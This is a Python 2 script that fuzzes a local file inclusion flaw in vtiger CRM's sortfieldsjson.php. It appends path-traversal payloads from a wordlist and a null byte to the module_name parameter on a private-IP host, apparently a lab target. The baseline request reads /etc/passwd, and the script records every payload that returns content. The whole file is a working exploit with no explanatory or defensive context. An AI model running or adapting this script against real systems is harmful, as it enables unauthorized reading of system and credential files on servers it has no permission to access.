#!/usr/bin/python
import time
import requests

start_time = time.time()

base_url = 'https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00'

fuzz_file = '/payloads/lfijhaddix.txt'

with open(fuzz_file, 'r') as f:
    f = f.readlines()
    #print len(f)

baseline = requests.get(base_url, verify=False)
body_length = len(baseline.text)
header_content_length = baseline.headers.get('content-length')
response_code = baseline.status_code

print base_url
print 'Response:',response_code
print 'Body:',body_length
print 'Reported body:', header_content_length
print '\n'

base_fuzz_url = 'https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../..'
null_byte = '%00'
anomalies = []
for line in f:
    try:
        line = line.strip()
        url = base_fuzz_url + line + null_byte
        #print url

        r = requests.get(url, verify=False)

        response_code = r.status_code
        response_header_length = r.headers.get('content-length')
        response_body_length = len(r.text)

        print line
        print 'Code:',response_code
        print 'Head:',response_header_length
        print 'Body:',response_body_length
        print '\n'
        if int(response_body_length) > 0:
            anomalies.append({'line:':line, 'Response Code:':response_code, 'Head:':response_header_length, 'Body:':response_body_length})


    except:
        print line
        print 'Error'
        print '\n'
        continue


print '+++++++++++++++++ ANOMALIES +++++++++++++++++\n'

for each in anomalies:
    for key,value in each.iteritems():
        print key, value
    print '\n'

end_time = time.time()
elapsed_time = (end_time - start_time)
print len(anomalies), 'Anomalies found in', '{0:.2f}'.format(elapsed_time), 'seconds', '\n'
